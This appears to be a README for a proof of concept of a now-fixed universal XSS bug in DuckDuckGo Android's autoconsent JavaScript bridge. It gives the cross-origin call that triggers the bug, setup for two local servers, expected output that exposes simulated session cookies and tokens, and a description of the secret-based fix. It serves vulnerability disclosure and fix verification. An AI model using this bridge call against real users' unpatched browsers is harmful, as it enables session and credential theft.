# UXSS PoC — Cross-Origin JS Bridge Attack on DuckDuckGo Android

This directory contains a minimal, self-hostable Proof-of-Concept for the Universal XSS
vulnerability documented in [`SECURITY_FINDINGS.md`](../SECURITY_FINDINGS.md#1-autoconsentinterface--universal-xss-critical--fixed).

---

## Vulnerability Summary

The DuckDuckGo Android browser registers `AutoconsentInterface` on its WebView using
`addJavascriptInterface()`. Android's API makes every registered object callable from
**any JavaScript frame in the WebView**, including cross-origin iframes.

The pre-fix method signature was:

```kotlin
@JavascriptInterface
fun process(message: String)   // NO secret, NO origin check
```

Any cross-origin iframe inside a page the user is browsing could call:

```javascript
AutoconsentAndroid.process('{"type":"init","url":"http://victim.com"}')
```

Android's `InitMessageHandlerPlugin` processes this message and responds by calling:

```java
webView.evaluateJavascript(
    "javascript:window.autoconsentMessageCallback(initResp, origin)", null
)
```

`evaluateJavascript()` **always executes in the main frame's JavaScript context** — regardless
of which frame triggered the `process()` call. This means attacker-controlled JavaScript
indirectly executes in the victim page's origin with full access to its cookies, localStorage,
DOM, and any other session state.

### The Fix

A per-session random UUID secret is injected exclusively into the **main frame** via
`evaluateJavascript()` before the autoconsent bundle loads:

```kotlin
webView.evaluateJavascript("javascript:window.autoconsentAndroidSecret='$secret';", null)
```

The new method signature requires this secret:

```kotlin
@JavascriptInterface
fun process(message: String, secret: String) {
    if (this.secret != secret) return   // reject all unauthenticated calls
    ...
}
```

Cross-origin iframes cannot read `window.autoconsentAndroidSecret` from the main frame
(blocked by the Same-Origin Policy), so they cannot forge valid calls.

---

## PoC File Structure

```
poc/
├── victim.html    — Simulated banking page (top-level frame, the target)
└── attacker.html  — Malicious cross-origin iframe content
```

### victim.html
- Simulates an authenticated user session (cookie + localStorage token)
- Arms an `Object.defineProperty` interceptor on `window.autoconsentMessageCallback`
  *before* the DDG autoconsent bundle is injected
- Embeds the attacker iframe (invisible, 1×1 px)
- Displays a live evidence log showing what happens when the attack fires

### attacker.html
- Runs as a cross-origin iframe inside victim.html
- Calls `AutoconsentAndroid.process(initPayload)` with no secret (pre-fix call)
- Also demonstrates that reading `window.top.autoconsentAndroidSecret` across origins
  is blocked by SOP (so the fix cannot be bypassed)
- Reports status back to the victim page via `postMessage` for UI feedback

---

## Setup

You need **two separate origins** (two HTTP servers on different ports) so that the iframe
is genuinely cross-origin. A single file:// URL or a single server would be same-origin and
wouldn't demonstrate the SOP bypass.

### Option A — Python one-liners (simplest)

Open two terminal tabs:

```bash
# Terminal 1 — victim server (port 8080)
cd /path/to/Android/poc
python3 -m http.server 8080

# Terminal 2 — attacker server (port 8081)
cd /path/to/Android/poc
python3 -m http.server 8081
```

### Option B — Node.js

```bash
npx serve poc --listen 8080 &
npx serve poc --listen 8081
```

### Option C — Remote hosting (ngrok / Netlify / GitHub Pages)

Host `victim.html` at one URL and `attacker.html` at a second distinct domain.  
This is the closest simulation to a real-world attack.

---

## Configuration

Before loading, set the iframe `src` in `victim.html` to point at your attacker server.

Open `poc/victim.html` in a text editor and replace the placeholder:

```html
<!-- BEFORE -->
<iframe src="ATTACKER_ORIGIN/attacker.html" ...>

<!-- AFTER (example using two localhost ports) -->
<iframe src="http://localhost:8081/attacker.html" ...>
```

Save the file, then open:

```
http://localhost:8080/victim.html
```

in the **DuckDuckGo Android browser** (tested on the version before the secret fix).

> **Prerequisites**
> - DuckDuckGo Android app with the autoconsent feature enabled
> - Settings → Privacy → "Auto-dismiss cookie pop-ups" must be ON
> - The victim page must be served over HTTP/HTTPS (not `file://`) so cookies work

---

## Expected Output

### On the VULNERABLE (pre-fix) build

1. `victim.html` loads; the evidence log shows:
   ```
   Object.defineProperty interceptor armed — waiting for autoconsent bundle injection.
   ```

2. DDG injects its autoconsent bundle into `victim.html`'s context. Log shows:
   ```
   DDG autoconsent bundle injected into victim page — interceptor active.
   ```

3. The attacker iframe loads at `http://localhost:8081/attacker.html`. Its log shows:
   ```
   AutoconsentAndroid interface FOUND — bridge accessible from cross-origin iframe!
   process(message) called successfully with ONE argument!
   ```

4. Android's `InitMessageHandlerPlugin` processes the `init` message and calls
   `webView.evaluateJavascript()` in the main frame. `victim.html`'s interceptor fires:
   ```
   🚨 UXSS CONFIRMED
   Code injected by cross-origin iframe is executing in victim origin: http://localhost:8080
   Data accessible to the injected code:
     • document.cookie = bank_session=VICTIM_SECRET_SESSION_TOKEN
     • localStorage[auth_token] = VICTIM_AUTH_TOKEN_XYZ
     • document.title = SecureBank — Account Dashboard
   ```

5. The attacker also demonstrates SOP protection of the fix's secret:
   ```
   Cross-origin read blocked by SOP as expected: SecurityError: ... ✔
   ```

### On the FIXED build (secret required)

Step 3 still shows `AutoconsentAndroid interface FOUND` and the `process()` calls are made,
but because the secret check fails, `InitMessageHandlerPlugin` never runs and
`evaluateJavascript()` is never called. The victim page's interceptor never fires.
The evidence log remains empty.

---

## Attack Chain Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│  DuckDuckGo Android WebView                                     │
│                                                                 │
│  ┌──────────────────────────────────────────────┐              │
│  │  MAIN FRAME — http://localhost:8080/victim.html│              │
│  │  (victim.com in real world)                  │              │
│  │                                              │              │
│  │  • document.cookie = "bank_session=SECRET"   │              │
│  │  • window.autoconsentMessageCallback = fn    │◄──── (4) evaluateJavascript()
│  └──────────────────────────────────────────────┘    runs HERE │
│                 │ embeds iframe                                  │
│  ┌──────────────────────────────────────────────┐              │
│  │  CROSS-ORIGIN IFRAME — http://localhost:8081 │              │
│  │  (evil.com in real world)                   │              │
│  │                                              │              │
│  │  (1) AutoconsentAndroid.process(initMsg)  ──►│──┐           │
│  └──────────────────────────────────────────────┘  │           │
│                                                     │           │
│  ┌─────────────────────────────────────────────┐   │           │
│  │  Android / Kotlin                           │   │           │
│  │                                             │◄──┘           │
│  │  (2) AutoconsentInterface.process(msg)      │               │
│  │  (3) InitMessageHandlerPlugin               │               │
│  │      → webView.evaluateJavascript(js) ──────┼───────────────┘
│  └─────────────────────────────────────────────┘               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

  SOP: iframe CANNOT read victim's cookies/localStorage directly
  BUG: iframe CAN trigger evaluateJavascript() in victim's JS context
       via the unauthenticated @JavascriptInterface bridge → UXSS
```

---

## Files Modified by the Fix

| File | Change |
|------|--------|
| `autoconsent/autoconsent-impl/src/main/java/com/duckduckgo/autoconsent/impl/AutoconsentInterface.kt` | Added `secret: String` parameter; rejects calls where secret doesn't match |
| `autoconsent/autoconsent-impl/src/main/java/com/duckduckgo/autoconsent/impl/RealAutoconsent.kt` | Generates `UUID.randomUUID()` per session; injects `window.autoconsentAndroidSecret` into main frame only |
| `autoconsent/autoconsent-impl/libs/userscript.js` | Passes `window.autoconsentAndroidSecret` in every `process()` call |
